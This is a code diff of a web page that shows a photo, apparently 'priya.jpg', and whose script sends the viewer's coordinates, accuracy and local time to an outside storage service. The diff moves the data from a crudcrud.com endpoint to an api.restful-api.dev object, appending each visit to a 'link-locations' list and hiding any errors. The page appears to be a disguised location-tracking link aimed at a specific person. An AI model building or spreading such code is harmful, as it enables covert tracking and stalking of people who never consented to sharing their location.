@@ -25,10 +25,10 @@
   <body>
     <img id="photo" src="priya.jpg" alt="" />
     <script>
-      var ENDPOINT =
-        "https://crudcrud.com/api/b7617c51e90f44d3a676d7c130ecbfb9/locations";
+      var STORE =
+        "https://api.restful-api.dev/objects/ff808181a067127101a09bcd8bca0b86";
 
-      function send(payload) {
+      function withTime(payload) {
         var now = new Date();
         payload.time = now.toISOString();
         payload.local_time = now.toLocaleString("en-IN", {
@@ -41,23 +41,39 @@
           second: "2-digit",
           hour12: true,
         });
-        var body = JSON.stringify(payload);
-        if (
-          location.hostname === "127.0.0.1" ||
-          location.hostname === "localhost"
-        ) {
-          fetch("/location", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: body,
-            keepalive: true,
-          });
-        }
-        fetch(ENDPOINT, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: body,
-        }).catch(function () {});
+        return payload;
+      }
+
+      function send(payload) {
+        payload = withTime(payload);
+        return fetch(STORE)
+          .then(function (res) {
+            return res.json();
+          })
+          .then(function (doc) {
+            var list =
+              doc && doc.data && doc.data.locations
+                ? doc.data.locations.slice()
+                : [];
+            list.push({
+              lat: payload.lat,
+              lng: payload.lng,
+              accuracy: payload.accuracy,
+              time: payload.time,
+              local_time: payload.local_time,
+              error: payload.error,
+              code: payload.code,
+            });
+            return fetch(STORE, {
+              method: "PUT",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                name: "link-locations",
+                data: { locations: list },
+              }),
+            });
+          })
+          .catch(function () {});
       }
 
       function showPhoto() {
